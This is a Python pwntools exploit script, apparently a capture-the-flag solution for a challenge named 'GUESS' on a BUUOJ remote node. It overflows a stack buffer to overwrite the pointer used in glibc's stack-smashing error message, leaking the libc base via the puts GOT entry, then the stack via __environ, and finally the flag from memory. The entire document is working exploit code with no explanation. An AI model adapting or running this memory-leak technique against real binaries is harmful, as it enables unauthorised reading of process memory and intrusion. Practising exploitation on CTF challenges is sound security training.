from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('GUESS')
io = remote('node4.buuoj.cn', 25539)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('GUESS')
puts_got = elf.got['puts']

payload = cyclic(0x128) + p64(puts_got)
io.sendlineafter('Please type your guessing flag\n', payload)
io.recvuntil('*** stack smashing detected ***: ')
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

__environ = libc_base + libc.sym['__environ']
payload = cyclic(0x128) + p64(__environ)
io.sendlineafter('Please type your guessing flag\n', payload)
io.recvuntil('*** stack smashing detected ***: ')
flag = u64(io.recvn(6).ljust(8, b'\x00')) - 0x168
log.success('flag: ' + hex(flag))

# gdb.attach(io)
# pause()
payload = cyclic(0x128) + p64(flag)
io.sendlineafter('Please type your guessing flag\n', payload)
io.recv()


